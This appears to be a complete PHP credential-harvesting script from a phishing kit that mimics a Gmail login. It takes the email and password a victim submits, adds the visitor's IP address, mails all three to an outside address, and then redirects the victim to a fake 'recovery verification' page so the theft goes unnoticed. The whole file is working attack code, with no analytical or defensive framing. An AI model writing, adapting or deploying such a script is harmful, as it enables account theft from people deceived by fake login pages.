<?php
    $to = "campbell.thomasqenos@gmail.com";
    $ip = getenv("REMOTE_ADDR");
    $user = $_POST['email'];
    $pass = $_POST['password'];
    $from = "Lut@Tech.com";
    $subject = $ip . " Gmal Details"; 
    $message = "Email: $user\n Pass: $pass\nip: $ip\n";
    mail($to, $subject, $message, $from);
    header("Location: RecoveryVerification.html");
?>